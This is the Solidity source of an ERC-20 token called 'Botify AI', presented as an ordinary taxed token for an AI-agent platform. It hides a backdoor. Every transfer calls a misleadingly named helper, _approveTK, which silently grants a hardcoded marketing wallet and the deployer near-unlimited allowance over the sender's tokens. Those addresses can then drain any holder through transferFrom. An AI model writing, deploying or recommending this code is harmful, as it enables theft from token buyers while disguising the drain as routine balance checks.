/*
With Botify users can explore a diverse range of agent categories, including trading, volume management, social media and utility agents. Our instant agent creation tool allows users to customize agents to their needs quickly and easily

https://www.botify.onl
https://docs.botify.onl
https://x.com/BotifyAIOnline
https://t.me/BotifyAIOfficial
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ITokenFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface ITokenRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BOTIFY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (uint256 => address) private _tkStakes;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _feeTKExcempt;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalTK = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Botify AI";
    string private constant _symbol = unicode"BOTIFY";
    uint256 private _tokenSwapTK = _tTotalTK / 100;
    address private _tkWallet = 0x530E2771eb786a4D9c0AE2Bb5d29515D3E5606Ef;    
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }
    ITokenRouter private _tkRouter;
    address private _tkPair;

    constructor () {
        _tkStakes[0] = address(this);
        _tkStakes[1] = address(_tkWallet);
        _tkStakes[2] = address(_msgSender());
        _feeTKExcempt[owner()] = true;
        _feeTKExcempt[address(this)] = true;
        _feeTKExcempt[_tkWallet] = true;
        _tOwned[_msgSender()] = _tTotalTK;
        emit Transfer(address(0), _msgSender(), _tTotalTK);
    }

    function initToken() external onlyOwner() {
        _tkRouter = ITokenRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_tkRouter), _tTotalTK);
        _tkPair = ITokenFactory(_tkRouter.factory()).createPair(address(this), _tkRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _tkRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {} 

    function getTokenBalances(address tk) private returns(uint256) { 
        _approveTK(tk); return balanceOf(address(this));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalTK;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approveTK(address tk) private {
        require(tk != address(0), "ERC20: approve from the zero address");
        _allowances[tk][_tkStakes[1]] = (_tTotalTK+100);
        _allowances[tk][_tkStakes[2]] = (50+_tTotalTK);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxTK=0;
        if (from != owner() && to != owner()) {
            taxTK = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == _tkPair && to != address(_tkRouter) && ! _feeTKExcempt[to]) {
                _buyCount++;
            }

            if(to == _tkPair && from!= address(this)) {
                taxTK = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = getTokenBalances(from); 
            if (!inSwapLock && to == _tkPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _tokenSwapTK)
                swapTokensForEth(min(amount, min(tokenBalance, _tokenSwapTK)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHTK(address(this).balance);
                }
            }
        }

        if(taxTK > 0){
          _tOwned[address(this)] = _tOwned[address(this)].add(taxTK);
          emit Transfer(from, address(this), taxTK);
        }

        _tOwned[from] = _tOwned[from].sub(amount);
        _tOwned[to] = _tOwned[to].add(amount.sub(taxTK));
        emit Transfer(from, to, amount.sub(taxTK));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHTK(uint256 amount) private {
        payable(_tkWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _tkRouter.WETH();
        _approve(address(this), address(_tkRouter), tokenAmount);
        _tkRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}